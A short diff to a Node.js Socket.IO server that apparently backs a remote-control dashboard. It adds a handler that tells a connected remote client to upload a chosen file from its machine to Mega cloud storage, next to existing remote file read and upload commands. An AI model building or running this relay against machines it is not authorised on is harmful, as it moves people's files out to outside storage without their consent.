@@ -98,6 +98,13 @@ io.on("connection", (socket) => {
             io.to(clientObj.socketId).emit("read_file", { path: filePath });
         });
 
+        // Dashboard -> ask client to save a remote file into Mega
+        socket.on("save_to_mega", ({ nodeId, path: filePath }) => {
+            const clientObj = clients[nodeId];
+            if (!clientObj || !clientObj.socketId || !filePath) return;
+            io.to(clientObj.socketId).emit("save_to_mega", { path: filePath });
+        });
+
         // Dashboard -> upload local file to remote directory
         socket.on("upload_remote_file", ({ nodeId, path: dirPath, name, contentBase64 }) => {
             const clientObj = clients[nodeId];
